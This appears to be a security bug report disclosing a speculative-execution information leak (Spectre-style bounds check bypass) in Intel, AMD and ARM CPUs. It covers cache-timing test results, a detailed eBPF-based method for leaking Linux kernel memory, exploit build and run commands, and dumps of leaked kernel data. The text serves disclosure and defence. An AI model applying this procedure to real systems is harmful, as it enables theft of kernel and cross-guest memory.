@@ -1,0 +1,1237 @@
+Subject: CPU security bug: information leak using speculative execution
+
+== INTRODUCTION ==
+This is a bug report about a CPU security issue that affects
+processors by Intel, AMD and (to some extent) ARM.
+
+I have written a PoC for this issue that, when executed in userspace
+on an Intel Xeon CPU E5-1650 v3 machine with a modern Linux kernel,
+can leak around 2000 bytes per second from Linux kernel memory after a
+~4-second startup, in a 4GiB address space window, with the ability to
+read from random offsets in that window. The same thing also works on
+an AMD PRO A8-9600 R7 machine, although a bit less reliably and slower.
+
+On the Intel CPU, I also have preliminary results that suggest that it
+may be possible to leak host memory (which would include memory owned
+by other guests) from inside a KVM guest.
+
+The attack doesn't seem to work as well on ARM - perhaps because ARM
+CPUs don't perform as much speculative execution because of a
+different performance-energy-tradeoff or so?
+
+All PoCs are written against specific processors and will likely
+require at least some adjustments before they can run in other
+environments, e.g. because of hardcoded timing tresholds.
+
+
+== THE BASIC ISSUE ==
+https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf
+says the following regarding Sandy Bridge in
+section 2.3.2.3 ("Branch Prediction"):
+
+    Branch prediction predicts the branch target and enables the
+    processor to begin executing instructions long before the branch
+    true execution path is known.
+
+In section 2.3.5.2 ("L1 DCache"):
+
+    Loads can:
+    [...]
+     - Be carried out speculatively, before preceding branches are
+       resolved.
+     - Take cache misses out of order and in an overlapped manner.
+
+
+This means that in the following code sample, if loading arr->length
+takes a long time because it's not present in the data caches, the
+processor can speculatively load data from
+arr->data[untrusted_offset_from_user]. This is an out-of-bounds
+read - however, that shouldn't matter because the processor will
+effectively roll back the execution state when the branch has
+executed; none of the speculatively executed instructions will retire.
+
+    struct array {
+      unsigned long length;
+      unsigned char data[];
+    };
+    struct array *arr = ...;
+    unsigned long untrusted_offset_from_user = ...;
+    if (untrusted_offset_from_user < arr->length) {
+      unsigned char value = arr->data[untrusted_offset_from_user];
+      ...
+    }
+
+
+However, in the following code sample, there's an issue. If
+arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached,
+but all other accessed data is, and the branch conditions
+are predicted as true, the processor can do the following
+speculatively before arr1->length has been loaded and the execution is
+re-steered:
+
+ - load value = arr1->data[untrusted_offset_from_user]
+ - start a load from a data-dependent offset in arr2->data, loading
+   the corresponding cacheline into the L1 cache
+
+    struct array {
+      unsigned long length;
+      unsigned char data[];
+    };
+    struct array *arr1 = ...; /* small array */
+    struct array *arr2 = ...; /* array of size 0x400 */
+    unsigned long untrusted_offset_from_user = ...; /* >0x400 */
+    if (untrusted_offset_from_user < arr1->length) {
+      unsigned char value = arr1->data[untrusted_offset_from_user];
+      unsigned long index2 = ((value&1)*0x100)+0x200;
+      if (index2 < arr2->length) {
+        unsigned char value2 = arr2->data[index2];
+      }
+    }
+
+After the execution has been re-steered, the cacheline containing
+arr2->data[index2] stays in the L1 cache. By measuring the time
+required to load arr2->data[0x200] and arr2->data[0x300], an attacker
+can then determine whether the value of index2
+during speculative execution was 0x200 or 0x300 - which discloses
+whether arr1->data[untrusted_offset_from_user]&1 is 0 or 1.
+
+Intel's optimization manual actually alludes to the possibility of
+similar visible timing side effects caused by speculative execution,
+e.g. in section 3.4.1.6:
+
+    The default predicted target for indirect branches and calls is
+    the fall-through path.
+    [...]
+    Placing data immediately following an indirect branch can cause a
+    performance problem. If the data consists of all zeros, it looks
+    like a long stream of ADDs to memory destinations and this can
+    cause resource conflicts and slow down branch recovery. Also, data
+    immediately following indirect branches may appear as branches to
+    the branch predication hardware, which can branch off to execute
+    other data pages. This can lead to subsequent self-modifying code
+    problems.
+
+
+
+== VERIFYING THE BASIC BEHAVIOR ==
+To verify that the basic attack pattern described in the previous
+section works as described, I have written a test program and run it
+against processors by Intel, AMD and ARM (with different assembly for
+x86-64 and aarch64). The test program performs a speculative array
+read after an incorrectly speculated bounds check and leaks the result
+of the speculative read through the data cache, without any privilege
+boundaries.
+
+The program attempts to leak the bitstring 1001011011110001. For every
+bit in the bitstring, the program prints two lines. Every second line
+contains pairs of (cacheline_read_time_bit0,cacheline_read_time_bit1).
+
+The programs used for the test are:
+ - for x86-64: in writeup_files/userland_test_x86; compile with
+   ./compile, run with ./test
+ - for aarch64: in writeup_files/userland_test_aarch64; compile with
+   ./compile (on an aarch64 system or in a qemu-user chroot), then run
+   with ./test (on an actual aarch64 device)
+
+Note that the x86-64 version uses mlockall() - to be able to use it,
+you'll have to either set the locked memory resource limit to
+unlimited or comment out the mlockall() call.
+
+Here are the test results. As you can see, the bitstring is
+successfully leaked on all three tested CPUs.
+
+=== Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz ===
+bit 0, expect 1
+  (254,70)  (256,70)  (245,73)  (245,73)  (251,73)  (268,76)  (248,73)  (262,81)  (248,81)  (256,70)  (245,73)  (248,81)  (251,81)  (251,81)  (245,73)  (245,73)  
+bit 1, expect 0
+  (73,242)  (73,239)  (73,245)  (73,242)  (81,242)  (70,242)  (73,245)  (73,242)  (70,239)  (73,242)  (70,239)  (81,245)  (70,239)  (73,242)  (73,242)  (70,231)  
+bit 2, expect 0
+  (67,231)  (70,244)  (70,245)  (70,245)  (73,239)  (81,245)  (70,245)  (81,242)  (73,242)  (73,242)  (73,242)  (73,242)  (73,239)  (73,239)  (70,231)  (67,231)  
+bit 3, expect 1
+  (248,73)  (248,73)  (259,73)  (259,73)  (248,70)  (259,73)  (259,73)  (256,73)  (256,73)  (259,73)  (259,73)  (256,73)  (256,73)  (259,73)  (259,73)  (250,67)  
+bit 4, expect 0
+  (70,231)  (70,956)  (81,242)  (73,239)  (73,231)  (70,231)  (81,245)  (73,254)  (73,239)  (81,239)  (73,245)  (81,245)  (73,245)  (73,245)  (70,237)  (70,231)  
+bit 5, expect 1
+  (253,67)  (256,70)  (256,70)  (256,70)  (262,81)  (256,70)  (256,70)  (256,70)  (256,70)  (248,81)  (245,73)  (248,73)  (248,73)  (259,73)  (256,73)  (248,73)  
+bit 6, expect 1
+  (245,81)  (248,73)  (256,70)  (245,73)  (259,73)  (256,70)  (256,70)  (256,73)  (245,73)  (256,70)  (256,70)  (256,70)  (245,73)  (256,70)  (256,70)  (247,70)  
+bit 7, expect 0
+  (73,242)  (73,242)  (73,245)  (73,254)  (70,239)  (70,239)  (73,245)  (73,239)  (70,245)  (73,242)  (73,242)  (70,239)  (70,242)  (81,245)  (70,231)  (67,234)  
+bit 8, expect 1
+  (248,73)  (245,81)  (256,70)  (256,70)  (256,70)  (248,73)  (256,70)  (256,70)  (256,70)  (245,73)  (256,70)  (256,70)  (253,67)  (240,70)  (250,70)  (247,70)  
+bit 9, expect 1
+  (248,73)  (251,73)  (256,73)  (256,73)  (256,73)  (248,73)  (256,73)  (256,73)  (256,73)  (245,73)  (256,73)  (256,73)  (256,73)  (247,67)  (237,70)  (250,70)  
+bit 10, expect 1
+  (248,73)  (248,73)  (259,73)  (256,70)  (256,70)  (245,73)  (256,73)  (256,70)  (256,70)  (248,73)  (256,70)  (256,70)  (256,70)  (237,70)  (250,67)  (256,70)  
+bit 11, expect 1
+  (248,73)  (248,73)  (251,81)  (251,73)  (245,73)  (256,70)  (245,73)  (259,73)  (259,73)  (256,70)  (256,70)  (256,70)  (256,70)  (248,73)  (256,70)  (259,73)  
+bit 12, expect 0
+  (70,245)  (73,239)  (70,239)  (73,242)  (73,239)  (70,239)  (73,242)  (73,242)  (73,242)  (73,239)  (70,239)  (73,242)  (70,239)  (67,231)  (70,231)  (67,231)  
+bit 13, expect 0
+  (70,245)  (73,242)  (73,239)  (81,242)  (73,239)  (70,242)  (70,242)  (70,242)  (73,245)  (73,242)  (70,245)  (73,239)  (73,239)  (70,231)  (70,231)  (70,244)  
+bit 14, expect 0
+  (73,242)  (73,239)  (81,245)  (73,245)  (73,239)  (70,239)  (73,245)  (73,242)  (73,242)  (81,242)  (73,242)  (73,239)  (70,239)  (70,244)  (70,231)  (67,231)  
+bit 15, expect 1
+  (256,70)  (245,73)  (256,70)  (251,81)  (256,70)  (245,73)  (245,73)  (256,70)  (256,70)  (245,73)  (256,70)  (256,73)  (256,70)  (256,70)  (243,70)  (250,70)
+
+=== AMD FX(tm)-8320 Eight-Core Processor ===
+bit 0, expect 1
+  (324,145) (325,145) (344,157) (335,157) (336,157) (337,157) (336,157) (337,157) (339,157) (335,157) (335,157) (335,157) (337,157) (337,157) (436,157) (337,157) 
+bit 1, expect 0
+  (157,334) (157,348) (157,338) (157,338) (157,336) (157,339) (157,336) (157,336) (157,336) (157,339) (157,334) (157,13216) (157,345) (157,335) (157,339) (145,320) 
+bit 2, expect 0
+  (157,340) (157,350) (157,337) (157,335) (157,339) (157,334) (157,336) (157,337) (157,335) (157,338) (157,339) (157,341) (157,347) (157,335) (157,337) (157,340) 
+bit 3, expect 1
+  (339,157) (337,157) (336,157) (336,157) (337,157) (337,157) (337,157) (337,157) (339,157) (337,157) (335,157) (344,157) (347,157) (335,157) (323,145) (323,145) 
+bit 4, expect 0
+  (157,341) (157,345) (157,337) (157,333) (157,335) (157,334) (157,333) (157,336) (157,333) (157,332) (157,337) (158,338) (157,347) (157,333) (157,338) (157,339) 
+bit 5, expect 1
+  (336,157) (336,157) (336,157) (335,157) (336,157) (334,157) (336,157) (335,157) (338,157) (335,157) (336,157) (348,157) (344,157) (336,157) (321,145) (322,145) 
+bit 6, expect 1
+  (397,157) (335,157) (337,157) (335,157) (337,157) (337,157) (337,157) (340,157) (340,157) (334,157) (337,157) (335,157) (344,157) (335,157) (337,157) (337,157) 
+bit 7, expect 0
+  (157,339) (157,335) (157,335) (157,338) (157,338) (157,335) (157,337) (157,336) (157,338) (158,336) (158,336) (157,343) (157,343) (157,338) (145,323) (145,319) 
+bit 8, expect 1
+  (343,157) (434,157) (336,157) (337,157) (337,157) (337,157) (337,157) (337,157) (337,157) (337,157) (337,157) (334,157) (346,157) (337,157) (337,157) (337,157) 
+bit 9, expect 1
+  (337,157) (340,157) (333,157) (337,157) (335,157) (337,157) (335,157) (339,157) (337,157) (335,157) (335,157) (342,157) (345,157) (337,157) (324,146) (320,145) 
+bit 10, expect 1
+  (344,157) (337,157) (337,157) (340,157) (337,157) (335,157) (337,157) (336,157) (337,157) (337,157) (337,157) (338,157) (343,157) (337,157) (336,157) (336,157) 
+bit 11, expect 1
+  (337,157) (337,157) (335,157) (334,157) (334,157) (333,157) (337,157) (337,157) (341,157) (337,157) (337,157) (345,157) (344,157) (336,157) (320,146) (325,145) 
+bit 12, expect 0
+  (158,343) (157,354) (158,1126)  (157,335) (157,336) (157,336) (157,337) (157,339) (157,335) (157,337) (157,338) (157,336) (157,1499)  (157,350) (157,336) (157,338) 
+bit 13, expect 0
+  (157,337) (157,335) (157,336) (157,334) (157,336) (157,338) (157,338) (157,339) (158,338) (157,339) (157,338) (157,338) (157,344) (157,339) (145,326) (145,322) 
+bit 14, expect 0
+  (157,343) (157,336) (158,354) (157,336) (157,338) (157,339) (157,339) (158,338) (157,339) (157,335) (157,335) (158,338) (157,339) (157,335) (157,339) (157,1115)  
+bit 15, expect 1
+  (336,157) (336,157) (336,157) (337,157) (336,157) (336,157) (336,157) (335,157) (337,157) (333,157) (336,157) (336,157) (343,157) (341,157) (335,157) (325,145)
+
+== AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G ==
+bit 0, expect 1
+  (472,171) (453,171) (451,170) (453,171) (463,171) (451,170) (453,171) (453,171) (453,171) (451,170) (452,171) (453,170) (456,171) (456,171) (482,171) (456,171) 
+bit 1, expect 0
+  (171,903) (171,903) (171,902) (171,902) (171,903) (171,908) (171,434) (170,810) (170,907) (171,427) (170,907) (171,901) (170,907) (171,901) (170,907) (171,725) 
+bit 2, expect 0
+  (170,426) (171,907) (171,907) (180,899) (181,903) (170,818) (171,910) (171,904) (170,902) (170,907) (171,909) (170,907) (170,436) (170,907) (170,901) (170,907) 
+bit 3, expect 1
+  (451,171) (450,170) (450,170) (453,171) (478,171) (448,170) (484,170) (448,170) (424,170) (453,170) (448,170) (453,170) (456,171) (440,170) (456,171) (807,171) 
+bit 4, expect 0
+  (171,903) (171,809) (171,1899)  (170,910) (170,904) (170,904) (171,903) (171,903) (170,1102)  (171,907) (171,907) (171,907) (170,908) (171,901) (171,901) (171,901) 
+bit 5, expect 1
+  (448,170) (452,170) (423,170) (452,170) (455,171) (449,170) (449,170) (429,171) (456,171) (456,171) (449,170) (456,171) (455,171) (449,170) (450,170) (426,170) 
+bit 6, expect 1
+  (454,170) (456,171) (448,170) (460,183) (454,170) (454,170) (454,170) (451,170) (454,171) (454,171) (454,171) (454,171) (453,171) (454,171) (454,171) (439,171) 
+bit 7, expect 0
+  (170,906) (170,906) (170,906) (171,905) (171,905) (171,905) (171,905) (171,905) (170,838) (171,905) (171,905) (171,905) (171,905) (170,906) (170,906) (170,906) 
+bit 8, expect 1
+  (454,171) (454,171) (454,171) (454,171) (454,171) (454,171) (454,171) (454,171) (454,170) (475,170) (454,170) (487,170) (451,170) (451,170) (475,170) (451,170) 
+bit 9, expect 1
+  (454,170) (452,170) (454,170) (454,171) (454,171) (454,171) (427,171) (454,171) (454,171) (453,171) (473,170) (427,171) (464,170) (454,170) (454,170) (987,170) 
+bit 10, expect 1
+  (428,170) (454,170) (454,170) (458,182) (451,170) (424,171) (456,171) (456,171) (450,171) (450,171) (425,170) (450,171) (448,170) (450,171) (456,171) (448,170) 
+bit 11, expect 1
+  (456,171) (477,171) (451,170) (451,170) (470,171) (451,170) (456,171) (456,171) (451,170) (451,170) (451,170) (451,170) (451,170) (453,171) (453,171) (1267,171)  
+bit 12, expect 0
+  (171,1101)  (171,901) (170,908) (170,908) (170,907) (170,908) (171,901) (171,903) (171,910) (171,902) (171,903) (171,902) (171,903) (171,910) (171,903) (171,902) 
+bit 13, expect 0
+  (171,427) (171,903) (170,907) (170,819) (171,901) (171,908) (170,907) (170,907) (171,908) (171,901) (171,901) (171,901) (171,903) (171,817) (171,902) (170,867) 
+bit 14, expect 0
+  (171,902) (171,903) (171,903) (182,899) (170,904) (171,830) (171,904) (171,908) (170,805) (171,426) (171,904) (171,907) (171,907) (171,432) (171,904) (170,814) 
+bit 15, expect 1
+  (455,171) (533,170) (468,170) (468,170) (453,170) (453,170) (465,170) (453,170) (455,171) (453,170) (995,171) (992,171) (453,170) (430,170) (453,170) (425,170) 
+
+
+=== Nexus 5x (bullhead), big core (ARM Cortex A57) ===
+bit 0, expect 1
+  (6,1) (5,0) (6,1) (5,0) (5,0) (6,1) (6,0) (5,0) (5,0) (6,0) (5,0) (5,0) (6,1) (6,0) (5,0) (6,1) 
+bit 1, expect 0
+  (1,6) (1,6) (0,5) (0,6) (1,6) (0,6) (0,6) (0,10)  (1,10)  (0,6) (1,5) (1,6) (0,5) (1,6) (0,6) (0,6) 
+bit 2, expect 0
+  (1,6) (0,6) (1,6) (1,6) (1,6) (1,6) (0,6) (0,6) (0,6) (1,6) (0,7) (0,6) (0,6) (0,6) (1,6) (1,12)  
+bit 3, expect 1
+  (5,0) (5,1) (6,0) (9,1) (6,1) (6,0) (5,0) (6,1) (9,1) (6,1) (6,0) (6,1) (5,0) (5,0) (6,1) (6,1) 
+bit 4, expect 0
+  (0,6) (1,6) (0,5) (1,6) (1,6) (1,6) (1,6) (0,6) (1,11)  (1,6) (1,6) (1,6) (0,6) (1,6) (1,6) (1,6) 
+bit 5, expect 1
+  (5,0) (5,0) (6,0) (6,0) (6,1) (5,0) (5,0) (5,0) (6,0) (6,1) (6,1) (6,1) (6,0) (6,1) (6,1) (6,0) 
+bit 6, expect 1
+  (5,0) (6,0) (6,1) (6,1) (5,0) (5,0) (6,1) (6,1) (6,0) (5,0) (5,0) (5,0) (6,1) (6,1) (6,1) (6,0) 
+bit 7, expect 0
+  (1,6) (1,5) (1,6) (1,6) (1,6) (1,6) (1,6) (1,6) (1,6) (0,5) (1,6) (1,6) (1,6) (0,6) (0,6) (1,6) 
+bit 8, expect 1
+  (5,1) (6,0) (8,1) (6,1) (6,1) (5,0) (6,1) (5,0) (10,0)  (5,0) (6,1) (5,0) (6,1) (6,1) (6,1) (5,0) 
+bit 9, expect 1
+  (6,1) (6,0) (5,0) (6,1) (6,0) (5,1) (6,1) (5,0) (6,1) (6,1) (6,1) (6,1) (6,1) (6,1) (6,1) (6,1) 
+bit 10, expect 1
+  (6,1) (8,1) (6,0) (6,1) (5,1) (6,1) (9,1) (5,1) (5,0) (6,1) (5,0) (8,1) (5,0) (5,0) (5,0) (6,1) 
+bit 11, expect 1
+  (5,0) (6,1) (6,0) (10,1)  (6,0) (6,0) (6,1) (11,0)  (6,0) (6,0) (6,1) (6,1) (5,0) (5,0) (5,0) (5,1) 
+bit 12, expect 0
+  (0,5) (0,5) (1,6) (1,6) (0,6) (0,6) (0,6) (1,6) (0,5) (0,6) (1,6) (0,6) (0,6) (1,6) (1,6) (1,6) 
+bit 13, expect 0
+  (1,6) (1,6) (1,6) (0,6) (0,6) (1,6) (1,6) (0,6) (0,6) (1,6) (1,6) (0,6) (1,5) (1,5) (0,6) (0,6) 
+bit 14, expect 0
+  (1,6) (0,6) (0,11)  (1,6) (0,6) (1,6) (1,6) (0,6) (0,6) (1,6) (0,6) (1,6) (1,6) (0,6) (1,6) (1,6) 
+bit 15, expect 1
+  (5,0) (6,0) (5,0) (5,1) (5,0) (6,0) (6,0) (5,1) (5,0) (6,0) (5,1) (5,0) (5,0) (5,0) (6,1) (5,0) 
+
+
+
+== ATTACKING THE LINUX KERNEL ON X86-64 ==
+One way in which this is can be abused on x86 is the eBPF bytecode
+interpreter and JIT engine contained in the Linux kernel since version
+3.18. It permits userspace to supply bytecode that is verified by the
+kernel and can then either be:
+
+ - interpreted by an in-kernel bytecode interpreter or
+ - translated to native machine code that also runs in kernel context
+   using a JIT engine (which translates individual bytecode
+   instructions without optimizations)
+
+Whether the JIT engine is enabled depends on a run-time configuration
+setting - but it seems like the attack works independent of that
+setting.
+
+Unlike classic BPF, eBPF has datatypes like data arrays and function
+pointer arrays into which eBPF bytecode can index. Therefore, it is
+possible to create the code pattern described above in the kernel
+using eBPF.
+
+eBPF's data arrays are less efficient than its function pointer
+arrays, so I'm using the latter where possible.
+
+Both machines on which I tested this have no SMAP, which simplifies
+the attack (but shouldn't be a strict precondition).
+Additionally, at least on the Intel machine I tested on, bouncing
+modified cachelines between cores is slow; my understanding is that
+this is caused by the use of the MESI protocol for cache coherence
+(as opposed to e.g. MOESI)?
+
+My implementation of the attack works as follows:
+
+ - create an eBPF function pointer array (BPF_MAP_TYPE_PROG_ARRAY)
+   named "prog_map" with size 2056 (will be placed in the kmalloc-4096
+   region by the kernel)
+ - at index 0 in prog_map, insert an eBPF program that does nothing
+   (more precisely: returns 0)
+ - leak the address of prog_map as follows (implemented in
+   get_prog_map_addr()):
+  - load an eBPF program that performs a tail call through prog_map,
+    at a bounds-checked 64-bit offset that can be set before program
+    execution using an eBPF data array "data_map"
+  - create 2^15 adjacent userspace memory mappings at
+    user_mapping_area ("area" in the code), each consisting of
+    2^4 pages, covering a total area of 2^31 bytes. each mapping maps
+    the same physical pages, and all mappings are present in the
+    pagetables.
+  - repeatedly call the eBPF program with different offsets, with
+    user_mapping_area-offset being in the kernel range of the 64-bit
+    address space (0xffff880000000000-0xffffffffffffffff), in
+    increments of 2^31
+   - for each eBPF program call with an out-of-bounds offset, perform
+     multiple calls with offset 0 to condition the branch prediction
+   - before calling the eBPF program with an invalid offset, bounce
+     the cacheline containing the length of prog_map to another core
+     in M (modified) state by taking and dropping a reference to the
+     eBPF array on the other core; this abuses that the array length
+     and the reference counter are stored in the same cacheline
+   - for each offset:
+    - if prog_map+offset is in the range
+      user_mapping_area..user_mapping_area+2^31, one of the 2^16
+      cachelines present in user_mapping_area will be loaded
+    - by probing the first 2^4 pages of user_mapping_area and
+      measuring the timing, it is possible to determine whether an
+      access was performed to any of the aliasing virtual addresses;
+      at least the L3 cache is physically indexed, so if a physical
+      page was accessed, an access to any virtual address referencing
+      the physical page should be served by at least the L3 cache
+  - at this point, the top of the address of prog_map is known
+    (from the offset guess at which a present cacheline was measured)
+    and the bottom of the address of prog_map is also known (from the
+    page at which a present cacheline was measured). the missing part
+    is the middle
+  - to leak the middle, bisect the remaining address space by mapping
+    two physical pages to adjacent ranges of virtual addresses, each
+    the size of half of the remaining search space, then determining
+    the remaining address bitwise
+ - load_mem_leaker_prog(): create an eBPF program that reads
+   8-byte-aligned 64-bit values from an eBPF data array "victim_map"
+   at an offset loaded from an eBPF map "data_map", bitmasks and
+   bitshifts the value so that one bit is mapped to one of two values
+   that are 2^7 bytes apart (sufficient to not land in the same or
+   adjacent cachelines when used as an array index) (also using
+   values from data_map), adds a 64-bit offset loaded from data_map,
+   then uses the resulting value as an offset into prog_map for a
+   tail call
+ - leak memory by repeatedly calling the eBPF program, with an
+   out-of-bounds offset into victim_map that specifies the data to
+   leak and an out-of-bounds offset into prog_map that causes
+   prog_map+offset to point to a userspace memory area
+  - again, mix in multiple calls with valid offsets for each call with
+    an invalid offset
+  - again, bounce the cachelines of victim_map and prog_map to another
+    core before every call with invalid offsets
+
+
+=== EXPLOIT USAGE (Intel) ===
+I have tested the exploit on an Intel Xeon CPU E5-1650 v3 machine with
+Ubuntu 14.04.5 LTS. I have tested both with Ubuntu's kernel
+4.4.0-75-generic and with a build of Linux 4.11 using a kernel config
+derived from Ubuntu's.
+For both kernels, I have tested with KASLR turned on.
+Note that if you want to run the exploit on 4.11, you should change
+the line "#define KERNEL_4_4_NOLOCKDEP" to
+"#define KERNEL_4_11_NOLOCKDEP".
+
+The exploit is in
+writeup_files/kernel_leak_exploit_intel_xeon_e5_1650_v3.
+Compile the exploit with
+"gcc -pthread -o bpf_stuff bpf_stuff.c -Wall -ggdb -std=gnu99".
+At least on Ubuntu 14.04.5, it seems like the kernel headers are too
+old, so you'll have to include those from somewhere else - e.g. by
+compiling the kernel yourself (with "make headers_install") (any
+kernel >=4.4 should do), then adding a parameter like this to
+the gcc invocation:
+"-I/path/to/linux-4.4/usr/include".
+
+Run the exploit with "./bpf_stuff". The output should look like this,
+with the hexdump starting after a few seconds:
+
+
+$ ./bpf_stuff 
+fixing up exit jump
+==========================
+0: (bf) r6 = r1
+1: (18) r1 = 0x9a278280
+3: (bf) r2 = r10
+4: (07) r2 += -4
+5: (62) *(u32 *)(r2 +0) = 1
+6: (85) call 1
+7: (15) if r0 == 0x0 goto pc+6
+ R0=map_value(ks=4,vs=8) R6=ctx R10=fp
+8: (79) r3 = *(u64 *)(r0 +0)
+9: (18) r2 = 0xab16f000
+11: (bf) r1 = r6
+12: (85) call 12
+13: (b7) r0 = 0
+14: (95) exit
+
+from 7 to 14: R0=imm0 R6=ctx R10=fp
+14: (95) exit
+==========================
+reload_time 32 at 0xffff88058000f000
+reload_time 32 at 0xffff88058000f000
+reload_time 32 at 0xffff88058000f000
+high-order and low-order bits look good
+leaking middle offset...
+testing for bit 30 (0x40000000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff88058000f000
+testing for bit 29 (0x20000000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x20000000; leaked_addr=0xffff8805a000f000
+testing for bit 28 (0x10000000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805a000f000
+testing for bit 27 (0x8000000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x8000000; leaked_addr=0xffff8805a800f000
+testing for bit 26 (0x4000000): votes: 8 vs 0; errors: 0, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805a800f000
+testing for bit 25 (0x2000000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x2000000; leaked_addr=0xffff8805aa00f000
+testing for bit 24 (0x1000000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x1000000; leaked_addr=0xffff8805ab00f000
+testing for bit 23 (0x800000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805ab00f000
+testing for bit 22 (0x400000): votes: 8 vs 0; errors: 0, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805ab00f000
+testing for bit 21 (0x200000): votes: 8 vs 0; errors: 0, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805ab00f000
+testing for bit 20 (0x100000): votes: 0 vs 8; errors: 0, 0; decided_bit=1; addr_mixin=0x100000; leaked_addr=0xffff8805ab10f000
+testing for bit 19 (0x80000): votes: 8 vs 0; errors: 0, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805ab10f000
+testing for bit 18 (0x40000): votes: 0 vs 8; errors: 0, 0; decided_bit=1; addr_mixin=0x40000; leaked_addr=0xffff8805ab14f000
+testing for bit 17 (0x20000): votes: 0 vs 8; errors: 0, 0; decided_bit=1; addr_mixin=0x20000; leaked_addr=0xffff8805ab16f000
+testing for bit 16 (0x10000): votes: 8 vs 0; errors: 0, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8805ab16f000
+LEAKED BPF ARRAY POINTER: 0xffff8805ab16f000
+==========================
+0: (b7) r0 = 0
+1: (95) exit
+==========================
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+==========================
+0: (bf) r6 = r1
+1: (18) r1 = 0x9a278180
+3: (bf) r2 = r10
+4: (07) r2 += -4
+5: (62) *(u32 *)(r2 +0) = 2
+6: (85) call 1
+7: (15) if r0 == 0x0 goto pc+42
+ R0=map_value(ks=4,vs=8) R6=ctx R10=fp
+8: (79) r7 = *(u64 *)(r0 +0)
+9: (18) r1 = 0x9a278180
+11: (bf) r2 = r10
+12: (07) r2 += -4
+13: (62) *(u32 *)(r2 +0) = 3
+14: (85) call 1
+15: (15) if r0 == 0x0 goto pc+34
+ R0=map_value(ks=4,vs=8) R6=ctx R7=inv R10=fp
+16: (79) r9 = *(u64 *)(r0 +0)
+17: (18) r1 = 0x9a278180
+19: (bf) r2 = r10
+20: (07) r2 += -4
+21: (62) *(u32 *)(r2 +0) = 1
+22: (85) call 1
+23: (15) if r0 == 0x0 goto pc+26
+ R0=map_value(ks=4,vs=8) R6=ctx R7=inv R9=inv R10=fp
+24: (79) r8 = *(u64 *)(r0 +0)
+25: (18) r1 = 0x9a278180
+27: (bf) r2 = r10
+28: (07) r2 += -4
+29: (62) *(u32 *)(r2 +0) = 0
+30: (85) call 1
+31: (15) if r0 == 0x0 goto pc+18
+ R0=map_value(ks=4,vs=8) R6=ctx R7=inv R8=inv R9=inv R10=fp
+32: (79) r0 = *(u64 *)(r0 +0)
+33: (bf) r2 = r10
+34: (07) r2 += -4
+35: (63) *(u32 *)(r2 +0) = r0
+36: (18) r1 = 0x895a2cc0
+38: (85) call 1
+39: (15) if r0 == 0x0 goto pc+10
+ R0=map_value(ks=4,vs=8) R6=ctx R7=inv R8=inv R9=inv R10=fp
+40: (79) r3 = *(u64 *)(r0 +0)
+41: (5f) r3 &= r7
+42: (7f) r3 >>= r9
+43: (67) r3 <<= 7
+44: (0f) r3 += r8
+45: (18) r2 = 0xab16f000
+47: (bf) r1 = r6
+48: (85) call 12
+49: (b7) r0 = 0
+50: (95) exit
+
+from 39 to 50: R0=imm0 R6=ctx R7=inv R8=inv R9=inv R10=fp
+50: (95) exit
+
+from 31 to 50: R0=imm0 R6=ctx R7=inv R8=inv R9=inv R10=fp
+50: (95) exit
+
+from 23 to 50: R0=imm0 R6=ctx R7=inv R9=inv R10=fp
+50: (95) exit
+
+from 15 to 50: R0=imm0 R6=ctx R7=inv R10=fp
+50: (95) exit
+
+from 7 to 50: R0=imm0 R6=ctx R10=fp
+50: (95) exit
+==========================
+00001000  d0 e7 09 9c ff ff ff ff 00 00 00 00 00 00 00 00  |................|
+00001010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+
+
+
+After initial startup, the exploit should dump kernel memory
+relatively quickly, at a rate of around 2000 bytes per second.
+You'll sometimes see question marks, indicating that reading from a
+memory location failed multiple times.
+
+
+
+Some kernel memory snippets from a test run:
+
+
+00001000  d0 e7 09 9c ff ff ff ff 00 00 00 00 00 00 00 00  |................|
+00001010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+
+0xffffffff9c09e7d0 is a kernel function pointer:
+
+# grep ffffffff9c09e7d0 /proc/kallsyms 
+ffffffff9c09e7d0 t put_cred_rcu
+
+
+00001070  30 b5 00 19 07 88 ff ff 30 f8 0c 00 08 88 ff ff  |0.......0.......|
+00001080  30 5e 5a fe 07 88 ff ff 88 44 5a 00 08 88 ff ff  |0^Z......DZ.....|
+00001090  88 44 5a 00 08 88 ff ff c8 38 5a 89 07 88 ff ff  |.DZ......8Z.....|
+000010a0  08 e9 4c 03 08 88 ff ff 90 38 5a 89 07 88 ff ff  |..L......8Z.....|
+
+These look like pointers into the kernel's heap (to be more precise,
+the physical mapping area). dmesg reveals that those pointers do point
+more or less into the area at which the kernel heap is be mapped:
+
+[    0.000000] PERCPU: Embedded 34 pages/cpu @ffff88080d200000 s98328 r8192 d32744 u262144
+
+
+000017a0  4f 43 61 6d 6c 20 69 6e 74 65 72 66 41 63 65 20  |OCaml interfAce |
+000017b0  74 6f 20 74 68 65 20 66 72 65 69 30 72 20 41 50  |to the frei0r AP|
+000017c0  49 20 2d 2d 20 64 65 76 65 6c 6f 70 70 65 6d 65  |I -- developpeme|
+000017d0  6e 74 20 66 69 6c 65 73 0a 20 54 68 69 73 20 70  |nt files. This p|
+000017e0  61 63 6b 61 67 65 20 70 72 6f 76 69 64 65 73 20  |ackage provides |
